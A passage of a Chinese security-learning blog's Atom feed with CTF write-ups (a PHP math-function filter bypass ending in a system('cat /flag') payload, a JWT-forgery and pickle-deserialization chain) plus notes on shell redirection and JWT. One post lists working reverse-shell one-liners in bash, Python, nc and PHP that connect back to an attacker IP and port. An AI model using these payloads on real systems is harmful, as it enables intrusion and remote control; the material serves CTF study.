src="/images/pasted-17.png" alt="upload successful"></p><p>   上面这段代码的效果就是将本地8080端口的一个请求代理到了<code>http://www.cdutzy.com/apis/API</code>这一域名下</p>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;api &#x3D;&#x3D;&#x3D;&gt; http:&#x2F;&#x2F;www.cdutzy.com&#x2F;apis&#x2F;API</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h5 id=&quot;跨域请求&quot;&gt;&lt;a href=&quot;#跨域请求&quot; class=&quot;headerlink&quot; title=&quot;跨域请求&quot;&gt;&lt;/a&gt;跨域请求&lt;/h5&gt;&lt;p&gt;1.浏览器从一个域名的网页去请求另一个域名的资源时，域名、端口、协议任一不同，都是跨域。（注意http和https是不同的协
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>CISCN2018-loveMath</title>
    <link href="http://yoursite.com/2020/05/26/CISCN2018-loveMath/"/>
    <id>http://yoursite.com/2020/05/26/CISCN2018-loveMath/</id>
    <published>2020-05-26T07:41:30.000Z</published>
    <updated>2020-05-26T09:19:05.414Z</updated>
    
    <content type="html"><![CDATA[<p>打开页面是一个php审计的题。先看一下源码</p><p><img src="/images/pasted-0.png" alt="upload successful"></p><p>要求传入一个参数c，c中不能含有空格,<code>[</code>,<code>]</code>,单引号，双引号以及反引号等、c的长度不能大于80，这里的过滤应该是为了防止我们传入<code>$_GET[]</code>之类的。</p><p>在看下面的白名单，这里用了正则过滤，要求过滤出来的字母必须为白名单内的函数。可以看到白名单内都是一些数学函数，备注也给了提示。这就有点难搞了。看了一下注释给的链接，里面有进制转换的相关函数，那么突破点应该就是在这里了。将我们想要执行的语句先进行一个进制转换，再在payload中转换回来，但是存在一个问题，通过$content返回的都是字符串，eval()是无法执行字符串的。</p><p>比如有这么一段代码。<br><img src="/images/pasted-1.png" alt="upload successful"></p><p>可以看到提示说eval()处多了引号。好了，卡在这里没思路了。还是去看了wp<br><img src="/images/pasted-2.png" alt="upload successful"></p><p><strong><em>这里是考了两个我不知道的点</em></strong></p><ol><li>php动态函数。只要在一个字符串变量后面加上括号，这个变量的字符串值就会变成函数名。附一张言简意赅的图。<br><img src="/images/pasted-3.png" alt="upload successful"></li><li>可以用<code>{}</code>来代替<code>[]</code></li></ol><p>由于我们要把这句话还原为字符串，所以必须要用到hex2bin()这个函数。hex2bin可以用10进制转36进制生成。<br><img src="/images/pasted-11.png" alt="upload successful"><br>构造第一步的payload生成hex2bin()函数，这里我们使用</p><p><img src="/images/pasted-6.png" alt="upload successful"></p><p><code>base_convert(37907361743,10,36)()</code> =&gt;<code>hex2bin()</code></p><p>由于eval()无法执行字符串，我们只能使用动态函数，即<code>(system)(cat /flag)</code>。其中<code>system</code>和<code>cat /flag</code>通过变量来表示。可以再传入两个参数a,b。<code>a=system&amp;b=cat /flag</code>的形式。由于限制了长度，这里我们需要尽量选取长度最小的数学函数名来作为变量名。往源码后面看，有一个pi函数。那么可以选<code>pi=system&amp;abs=cat /flag</code>。那么我们接下来的形式就为<code>(pi)(abs)</code>。</p><p>这里的pi和abs是通过get传参传过去的，那么要获取这两个变量也必须通过<code>$_GET[]</code>的形式。现在问题就在于如何使用进制转换来得到<code>_GET</code>。由于<code>$</code>没被过滤。<code>[]</code>可以用<code>{}</code>来代替，所以只考虑<code>_GET</code>。</p><p>刚刚已经得到了hex2bin()函数。如果想到<code>_GET</code>转换为hex字符串，其中含有字母就无法绕过黑名单。（可以尝试一下abs(a)是会被检测出来的）<br>这里我们就需要把hex字符串转为10进制，再通过<code>dechex()</code>转换回hex</p><p><img src="/images/pasted-7.png" alt="upload successful"></p><p><img src="/images/pasted-8.png" alt="upload successful"></p><p><img src="/images/pasted-9.png" alt="upload successful"></p><p>第二步的payload </p><p><code>dechex(1598506324)</code></p><p>将其和第一步的payload结果起来就是</p><p><code>base_convert(37907361743,10,36)(dechex(1598506324))</code> =&gt;<code>_GET</code></p><p>(做到这步我才知道为啥要限制c的长度了。)</p><p>现在我们想要使用<code>_GET</code>的话，还需要把它赋值给一个变量。还是选取长度最短的pi</p><p>payload:</p><p><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324))</code></p><p>接下来就很好表示<code>(system)(cat /flag)</code>了。payload：</p><p><code>($$pi){pi}(($$pi){abs})&amp;pi=system&amp;ads=cat /flag</code> =&gt; <code>($_GET[pi])($_GET[abs])</code>=&gt;<code>(system)(cat /flag)</code></p><p>PS:</p><ol><li>(system)和system是一样的。</li><li>system(‘ls’) === system(ls)</li></ol><p>再把两部分结合起来，得到最终的payload:</p><p><code>?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat /flag</code></p><p>检查一下长度，79。很是惊险了。<br><img src="/images/pasted-13.png" alt="upload successful"></p><p><img src="/images/pasted-12.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;打开页面是一个php审计的题。先看一下源码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/pasted-0.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;
&lt;p&gt;要求传入一个参数c，c中不能含有空格,&lt;code&gt;[&lt;/code&gt;,&lt;code&gt;]&lt;/c
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>shell反弹</title>
    <link href="http://yoursite.com/2020/05/24/shell%E5%8F%8D%E5%BC%B9/"/>
    <id>http://yoursite.com/2020/05/24/shell%E5%8F%8D%E5%BC%B9/</id>
    <published>2020-05-24T08:39:07.000Z</published>
    <updated>2020-06-12T12:02:30.464Z</updated>
    
    <content type="html"><![CDATA[<p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。某些情况下正向连接不太好使。</p><p>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p><p>2.它的ip会动态改变，你不能持续控制。</p><p>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p><p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p><p>那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p><h4 id="现在谈一下shell反弹的方法。"><a href="#现在谈一下shell反弹的方法。" class="headerlink" title="现在谈一下shell反弹的方法。"></a>现在谈一下shell反弹的方法。</h4><p>kali：192.168.124.128</p><p>centos7：192.168.124.132</p><h5 id="1-bash反弹"><a href="#1-bash反弹" class="headerlink" title="1. bash反弹"></a>1. bash反弹</h5><ul><li><p>通过 <code>nc -lvp port</code> 监听本机的一个端口号</p></li><li><p>使用 <code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code><br>或<code>bash -i &gt; /dev/tcp/ip/post 0&gt;&amp;1 2&gt;&amp;1</code></p></li></ul><p>反弹shell。这是经典的反弹shell的语句，这里分析一下原理。</p><ol><li>使用<code>bash -i</code> 启动交互式shell</li><li><code>&gt;&amp;</code> 将stdout 1,stderr 2都指向主机的端口</li><li><code>0&gt;&amp;1</code> 将stdin 0 指向主机端口。</li></ol><ul><li>这样0,1,2 都指向了主机端口。受害机通过端口读取主机的命令并执行，将执行的结果输出到主机上。就实现了将受害机的shell弹给主机。</li></ul><p><img src="/images/pasted-60.png" alt="upload successful"></p><p><img src="/images/pasted-59.png" alt="upload successful"></p><h5 id="2-sh反弹"><a href="#2-sh反弹" class="headerlink" title="2. sh反弹"></a>2. sh反弹</h5><p>原理和bash反弹相同</p><p><code>sh &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</code></p><h5 id="3-Python方式"><a href="#3-Python方式" class="headerlink" title="3. Python方式"></a>3. Python方式</h5><p><code>python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;ip&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;</code></p><p><img src="/images/pasted-61.png" alt="upload successful"></p><h5 id="4-nc反弹"><a href="#4-nc反弹" class="headerlink" title="4. nc反弹"></a>4. nc反弹</h5><p>PS：必须服务器安装了nc。可以用<code>nc --help</code>检验</p><ul><li>存在-e参数时可以直接反弹 </li></ul><p><code>nc -e /bin/bash ip port</code> </p><p><img src="/images/pasted-62.png" alt="upload successful"></p><ul><li>不存在-e时 </li></ul><p><code>mknod backpipe p; nc IP PORT 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe</code></p><p><img src="/images/pasted-63.png" alt="upload successful"></p><h5 id="5-php方式"><a href="#5-php方式" class="headerlink" title="5.php方式"></a>5.php方式</h5><p><code>php -r &#39;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/IP/PORT&quot;)&#39;</code></p><p>或</p><p><code>php -r &#39;$sock=fsockopen(&quot;IP&quot;,PORT);exec(&quot;/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p><p><a href="https://krober.biz/misc/reverse_shell.php" target="_blank" rel="noopener">附上一个shell反弹的神器</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。某些情况下正向连接不太好使。&lt;/p&gt;
&lt;p&gt;1.某客户机中了你的网
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>文件描述符与重定向</title>
    <link href="http://yoursite.com/2020/05/24/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/"/>
    <id>http://yoursite.com/2020/05/24/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/</id>
    <published>2020-05-24T07:05:25.000Z</published>
    <updated>2020-05-24T11:00:09.494Z</updated>
    
    <content type="html"><![CDATA[<h5 id="1-文件描述符"><a href="#1-文件描述符" class="headerlink" title="1. 文件描述符"></a>1. 文件描述符</h5><ul><li><p>文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。可以理解为linux跟踪打开文件，而分配的一个数字。(摘自维基百科)</p></li><li><p>linux启动时有三个标准的文件描述符</p><pre><code>标准输入standard input 0 （默认设备键盘）标准输出standard output 1（默认设备显示器）错误输出：error output 2（默认设备显示器）</code></pre></li><li><p>由于在Linux中一切皆文件，文件所有输入输出都是由该进程所有打开的文件描述符控制的。</p></li></ul><h5 id="2-重定向"><a href="#2-重定向" class="headerlink" title="2. 重定向"></a>2. 重定向</h5><p>由于标准的文件描述符默认取设备(从键盘读取内容，显示器输出内容)。当我们想要将输出的结果保存在某个文件时，就需要对文件描述符进行重定向。换个角度说，<strong><em>重定向就是针对文件描述符的</em></strong></p><ul><li><p>首先要注意一点是bash在执行一条执行的时候，首先会检查命令中是否存在重定向的符号，如果存在那么首先将文件描述符重定向，然后在把重定向去掉，执行指令。</p></li><li><p>重定向中含有多个指令时，从左往右依次解析。(不能随意颠倒顺序)</p></li><li><p><code>&lt;</code> 是对0进行重定向，<code>&gt;</code>对进行重定向</p></li></ul><h6 id="2-1-输入重定向"><a href="#2-1-输入重定向" class="headerlink" title="2.1 输入重定向"></a>2.1 输入重定向</h6><p>格式：[n]&lt; filename </p><p>(<code>[n]</code>与<code>&lt;</code>间没有空格。<code>&lt;</code>与filename间有空格)。</p><p>举个小栗子。在linux下新建一个文件，文件名为file，在file中写入 <code>hello wrold</code>  。现在使用输入重定向来读取file中的字符。这里把0省略掉用  <code>&lt; file cat</code> 也是一样的</p><p><img src="/2020/05/24/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/1.png" alt></p><p>解析器首先解析指令中是否含有重定向的符号。解析到<code>&lt;</code>时会先处理重定向，把标准输入指向file。最后的cat就会从标准输入读取内容。即输出<code>hello world</code></p><p><img src="/2020/05/24/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/2.png" alt></p><h6 id="2-2-输出重定向"><a href="#2-2-输出重定向" class="headerlink" title="2.2 输出重定向"></a>2.2 输出重定向</h6><p>格式：<code>[n]&gt; filename</code> </p><p><img src="/2020/05/24/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/3.png" alt></p><p>这是首先将标准输出(echo的内容)指向newfile，使用echo输出内容时就会输出到newfile中，不会显示在屏幕上。</p><p><img src="/2020/05/24/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/4.png" alt></p><h6 id="2-3-标准输出与标准错误输出重定向"><a href="#2-3-标准输出与标准错误输出重定向" class="headerlink" title="2.3 标准输出与标准错误输出重定向"></a>2.3 标准输出与标准错误输出重定向</h6><p>格式：    </p><pre><code>&amp;&gt; file 或&gt;&amp; file</code></pre><p>两者都等价于 <code>&gt; file 2&gt;&amp;1</code></p><p>解释一下第二个。这里先将标准输出指向file，再将标准错误输出复制到标准输出。即标准输入和标准错误输出都指向了file</p><p><img src="/2020/05/24/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/5.png" alt></p><h6 id="2-4-文件描述符的复制。"><a href="#2-4-文件描述符的复制。" class="headerlink" title="2.4 文件描述符的复制。"></a>2.4 文件描述符的复制。</h6><p>格式：<code>[n]&lt;&amp;[m] / [n]&gt;&amp;[m]</code></p><p>(这里所有字符间都不要空格)</p><p>这里两个都是将文件描述符 n 复制到 m ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开</p><p><strong><em>因此 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读/写方式打开对其没有任何影响）</em></strong></p><p><strong><em>&amp; 目的是为了区分数字名字的文件和文件描述符，如果没有&amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符</em></strong></p><p>PS:个人觉得这里的复制不是很好理解。我更愿意理解为指向。将n指向m</p><p>这里也举个例子。(这个例子比较重要，看懂这个差不多就明白了前面的内容。)这里有两条指令，不过执行的顺序不同</p><pre><code>cmd &gt; file 2&gt;&amp;1cmd 2&gt;&amp;1 &gt;file</code></pre><ul><li>先执行第一条命令，这里的 <code>cmd</code> 我们使用 <code>cat flag</code>。此时flag这个文件并不存在，若直接访问会报错。可以看到将标准错误输出写入了file。</li></ul><p><img src="/2020/05/24/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/6.png" alt></p><ul><li>现在再用<code>ls</code>代替掉<code>cmd</code>，当使用一个正确的指令时。这里将标准输出也写入了file。</li></ul><p><img src="/2020/05/24/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/7.png" alt></p><p><strong>分析一下原理</strong>：首先将标准输出指向file,再将标准错误输出也指向file。这样正确和错误的信息都会写入file。</p><ul><li>现在看一下第二条语句，要稍微复杂一些。还是举个例子。这里可以看出和第一条命令的执行结果有写不同，这里是把标准错误输出直接显示在控制台，标准输出写入了file文件。</li></ul><p><img src="/2020/05/24/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/8.png" alt></p><p><strong>也分析一下原理</strong>：</p><ul><li>当解析到 <code>2&gt;&amp;1</code>时，将标准错误输出指向标准输出。此时</li></ul><p><img src="/2020/05/24/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/9.png" alt></p><ul><li>当执行到  <code>&gt;</code>时。将标准输出指向file</li></ul><p><img src="/2020/05/24/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/10.png" alt></p><h6 id="2-5-绑定重定向"><a href="#2-5-绑定重定向" class="headerlink" title="2.5 绑定重定向"></a>2.5 绑定重定向</h6><p>上面的输入输出重定向将输入和输出绑定文件只对当前的那条指令有效，如果需要接下来的指令都支持的话就需要使用 exec 指令</p><ul><li>格式：<code>exec [n] &lt;/&gt; file/[n]</code></li></ul><p>以读写方式打开word指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入。</p><p><img src="/2020/05/24/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/12.png" alt></p><p>逐句分析一下：</p><ul><li><p><code>exec 4&lt;&gt;file</code> 这里将自定义的文件描述符4指向了file。</p></li><li><p><code>ls &gt;&amp;4</code> 将ls的结果指向文件描述符4,也就是将标准输出写入到了file中。</p></li></ul><p>PS：大部分内容摘自下面这篇文章，但对其中的指令做了更细节化的解读</p><p><a href="https://xz.aliyun.com/t/2548" target="_blank" rel="noopener">参考链接</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h5 id=&quot;1-文件描述符&quot;&gt;&lt;a href=&quot;#1-文件描述符&quot; class=&quot;headerlink&quot; title=&quot;1. 文件描述符&quot;&gt;&lt;/a&gt;1. 文件描述符&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[Web2]ikun</title>
    <link href="http://yoursite.com/2020/05/20/Web2-ikun/"/>
    <id>http://yoursite.com/2020/05/20/Web2-ikun/</id>
    <published>2020-05-20T13:44:12.000Z</published>
    <updated>2020-05-23T17:07:51.378Z</updated>
    
    <content type="html"><![CDATA[<p>注册登录后，页面是一个购买lv等级的页面。先随便尝试买一个lv。发现均是购买失败。<br><img src="/2020/05/20/Web2-ikun/1.png" alt></p><p>这里可以看到提示说一定要买到lv6。随便翻了几页也没有找到lv6。写个脚本。</p><p><img src="/2020/05/20/Web2-ikun/2.png" alt>跑出来结果在p181。</p><p><img src="/2020/05/20/Web2-ikun/3.png" alt></p><p>这里也是一个结算页面。但支付的金额根本不够，抓包。<br><img src="/2020/05/20/Web2-ikun/4.png" alt></p><p>这里存在一个薅羊毛漏洞，把discount改为0.00000001。发过去</p><p><img src="/2020/05/20/Web2-ikun/5.png" alt></p><p>显示只有管理员才能登陆。从之前抓的包可以看到cookie内是存在jwt的。将cookie内的jwt放到<a href="https://jwt.io/" target="_blank" rel="noopener">jwt生成网站</a>。<br><img src="/2020/05/20/Web2-ikun/6.png" alt></p><p>usrname正是我们注册的用户名。在kali上破解一下jwt的密钥<br><img src="/2020/05/20/Web2-ikun/7.png" alt></p><p>密钥是1Kun</p><p><img src="/2020/05/20/Web2-ikun/8.png" alt></p><p>把username改为admin，输入密钥，就可以生成对应的jwt。此时cookie内改成我们伪造的jwt。再次发包过去。已经登录进去了。</p><p><img src="/2020/05/20/Web2-ikun/9.png" alt></p><p>查看源码，这里有一份备份文件。</p><p><img src="/2020/05/20/Web2-ikun/10.png" alt></p><p>审计一下源码。在Admin.py 有个反序列化点。这里接受become的值并将其反序列化。由于没有对become的值做限制，我们可以自己构造一个类和对象，并在其中执行shell命令。由于<code>__reduce__</code>是在反序列化时自动执行，所以选取它做魔术方法。<br><img src="/2020/05/20/Web2-ikun/11.png" alt></p><p>贴上python脚本</p><p><img src="/2020/05/20/Web2-ikun/12.png" alt></p><p>这里有几个需要注意的点：</p><ol><li>源码是在python2的环境下执行的，脚本也需要在python2上执行，这里我选的是python2.7。在python3.x上试过会出问题。</li><li>payload这个类必须继承object，否则不会拥有<code>__reduce__</code>这个魔术方法。这个还是python2和python3的版本问题。</li></ol><p><a href="https://blog.csdn.net/qq_27828675/article/details/79358893" target="_blank" rel="noopener">关于Python中object的继承问题</a></p><p>执行结果如下，</p><p><img src="/2020/05/20/Web2-ikun/13.png" alt></p><p>最后点击一键成为大会员。修改数据包。修改become的数据即可得到flag。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;注册登录后，页面是一个购买lv等级的页面。先随便尝试买一个lv。发现均是购买失败。&lt;br&gt;&lt;img src=&quot;/2020/05/20/Web2-ikun/1.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;这里可以看到提示说一定要买到lv6。随便翻了几页也没有找到lv6。写个脚本。&lt;/p
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>python序列化以及对应魔术方法</title>
    <link href="http://yoursite.com/2020/05/16/python%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A5%E5%8F%8A%E5%AF%B9%E5%BA%94%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"/>
    <id>http://yoursite.com/2020/05/16/python%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A5%E5%8F%8A%E5%AF%B9%E5%BA%94%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/</id>
    <published>2020-05-16T09:10:52.000Z</published>
    <updated>2020-05-16T09:33:00.194Z</updated>
    
    <content type="html"><![CDATA[<p>ctf中python序列化和反序列的题目还是挺多的，一般在利用反序列化时都会涉及到对应的魔术方法，和php很类似。在这里也做个总结，免得遇到的时候四处查。</p><h2 id="pickle模块"><a href="#pickle模块" class="headerlink" title="pickle模块"></a>pickle模块</h2><ol><li><p>pickle模块只能在python中使用，且只支持python的基础数据类型</p></li><li><p>序列化的时候，只是序列化了整个序列对象，而不是内存地址。</p></li><li><p>序列化：</p><ul><li><p><code>pickle.dump()</code>方法将obj对象序列化为bytes写入到file文件中</p><p><code>pickle.dump(obj, file, protocol=None, *, fix_imports=True)</code></p></li></ul><ul><li><p><code>pickle.dumps()</code>方法将obj对象序列化并返回一个bytes对象</p><p><code>pickle.dumps(obj, protocol=None, *, fix_imports=True)</code></p></li></ul></li><li><p>反序列化：</p><ul><li><p><code>pickle.load()</code>从一个对象文件中读取序列化数据，将其反序列化之后返回一个对象</p><p><code>pickle.load(file, *, fix_imports=True, encoding=&quot;ASCII&quot;, errors=&quot;strict&quot;)</code></p></li></ul><ul><li><p><code>pickle.loads()</code>将bytes反序列化并返回一个对象</p><p><code>pickle.loads(bytes_object, *, fix_imports=True, encoding=&quot;ASCII&quot;, errors=&quot;strict&quot;)</code></p></li></ul></li></ol><h2 id="序列化与反序列化中使用的魔术方法"><a href="#序列化与反序列化中使用的魔术方法" class="headerlink" title="序列化与反序列化中使用的魔术方法"></a>序列化与反序列化中使用的魔术方法</h2><p><img src="/2020/05/16/python%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A5%E5%8F%8A%E5%AF%B9%E5%BA%94%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/1.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ctf中python序列化和反序列的题目还是挺多的，一般在利用反序列化时都会涉及到对应的魔术方法，和php很类似。在这里也做个总结，免得遇到的时候四处查。&lt;/p&gt;
&lt;h2 id=&quot;pickle模块&quot;&gt;&lt;a href=&quot;#pickle模块&quot; class=&quot;headerlink
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>JWT</title>
    <link href="http://yoursite.com/2020/05/15/JT/"/>
    <id>http://yoursite.com/2020/05/15/JT/</id>
    <published>2020-05-15T14:09:52.000Z</published>
    <updated>2020-05-24T08:43:19.832Z</updated>
    
    <content type="html"><![CDATA[<h3 id="JWT是一种跨域身份验证的解决方案。"><a href="#JWT是一种跨域身份验证的解决方案。" class="headerlink" title="JWT是一种跨域身份验证的解决方案。"></a>JWT是一种跨域身份验证的解决方案。</h3><ol><li><p>要说JWT，必须先说一下session。session分为会话session和持久session。</p><ul><li><p>会话session:只作用于本次会话，此时的session存储在浏览器内存中。当用户关闭浏览器后，此次session会过期。如果用户打开浏览器想继续这次会话的时候,就会因为发送的请求中没有这个sessionid而使服务器无法辨别该把那个session信息给他,注意(这个时候服务器端的sessionid和sessionid所指向的session都还存在,只是没有正确的sessionid和它匹配而占用服务器内存,只有session过期或服务器重启才释放内存</p></li><li><p>持久session:把cookie固化在用户的计算机上,可以在多次绘画中使用使用。现在的cookie不单单能存放sessionid,还能放用户信息,样式表信息等。持久化session也是实现跨域身份验证的一种解决方案。</p></li></ul></li><li><p>现在可以说到JWT了。当用传统的持久session来解决跨域身份验证时，有一个缺点在于此时session都是依赖于持久层的数据库或者问题系统，会有单点风险，如果持久层失败，整个认证体系都会挂掉。而JWT通过客户端保存数据，服务器根本不保存会话数据，每个请求都被发送回服务器。</p></li><li><p>JWT的原则是在服务器身份验证之后，将生成一个JSON对象并将其发送回用户，之后，当用户与服务器通信时，客户在请求中发回JSON对象。服务器仅依赖于这个JSON对象来标识用户。为了防止用户篡改数据，服务器将在生成对象时添加签名。</p></li><li><p>JWT分为三个部分。JWT头、有效载荷和签名。JWT将三个部分通过“.”连接在一起形成一个很长的字符串</p><ul><li><p>JWT头部分是一个描述JWT元数据的JSON对象，如：</p><p><code>{</code></p><p><code>&quot;alg&quot;: &quot;HS256&quot;,</code></p><p> <code>&quot;typ&quot;: &quot;JWT&quot;  }</code></p></li><li><p>有效载荷，有效载荷部分，是JWT的主体内容部分，也是一个JSON对象，包含需要传递的数据。 JWT指定七个默认字段供选择。</p><p>iss：发行人</p><p>exp：到期时间</p><p>sub：主题</p><p>aud：用户</p><p>nbf：在此之前不可用</p><p>iat：发布时间</p><p>jti：JWT ID用于标识该JWT</p><p>除以上默认字段外，我们还可以自定义私有字段，如下例：</p><p><code>{</code></p><p>  <code>&quot;sub&quot;: &quot;1234567890&quot;,</code></p><p> <code>&quot;name&quot;: &quot;chongchong&quot;,</code></p><p>  <code>&quot;admin&quot;: true</code></p><p> <code>}</code></p></li></ul><ul><li>签名哈希部分是对上面两部分数据签名，通过指定的算法生成哈希，以确保数据不会被篡改。</li></ul></li><li><p>JWT的使用</p><p> 客户端接收服务器返回的JWT，将其存储在Cookie或localStorage中。<br>此后，客户端将在与服务器交互中都会带JWT。如果将它存储在Cookie中，就可以自动发送，但是不会跨域，因此一般是将它放入HTTP请求的Header Authorization字段中。</p><p> Authorization: Bearer</p><p> 当跨域时，也可以将JWT被放置于POST请求的数据主体中。</p></li><li><p>注意事项</p><ul><li><p>JWT默认不加密，但可以加密。生成原始令牌后，可以使用改令牌再次对其进行加密。</p></li><li><p>当JWT未加密方法时，一些私密数据无法通过JWT传输。</p></li><li><p>JWT不仅可用于认证，还可用于信息交换。善用JWT有助于减少服务器请求数据库的次数。</p></li><li><p>JWT的最大缺点是服务器不保存会话状态，所以在使用期间不可能取消令牌或更改令牌的权限。也就是说，一旦JWT签发，在有效期内将会一直有效。</p></li><li><p>JWT本身包含认证信息，因此一旦信息泄露，任何人都可以获得令牌的所有权限。为了减少盗用，JWT的有效期不宜设置太长。对于某些重要操作，用户在使用时应该每次都进行进行身份验证。</p></li><li><p>为了减少盗用和窃取，JWT不建议使用HTTP协议来传输代码，而是使用加密的HTTPS协议进行传输。</p></li></ul></li></ol><p>PS：JWT是可破解和伪造的。在这里附上JWT破解工具和生成链接</p><p><a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">破解工具</a> </p><p><a href="https://jwt.io/" target="_blank" rel="noopener">生成网站</a></p><p><a href="https://www.cnblogs.com/zhangxp1129/archive/2012/08/20/2647767.html" target="_blank" rel="noopener">参考链接</a></p><p><a href="https://baijiahao.baidu.com/s?id=1608021814182894637&wfr=spider&for=pc" target="_blank" rel="noopener">参考链接</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;JWT是一种跨域身份验证的解决方案。&quot;&gt;&lt;a href=&quot;#JWT是一种跨域身份验证的解决方案。&quot; class=&quot;headerlink&quot; title=&quot;JWT是一种跨域身份验证的解决方案。&quot;&gt;&lt;/a&gt;JWT是一种跨域身份验证的解决方案。&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[WesternCTF2018]shrine</title>
    <link href="http://yoursite.com/2020/05/15/WesternCTF2018-shrine/"/>
    <id>http://yoursite.com/2020/05/15/WesternCTF2018-shrine/</id>
    <published>2020-05-15T02:33:00.000Z</published>
    <updated>2020-05-23T17:09:00.525Z</updated>
    
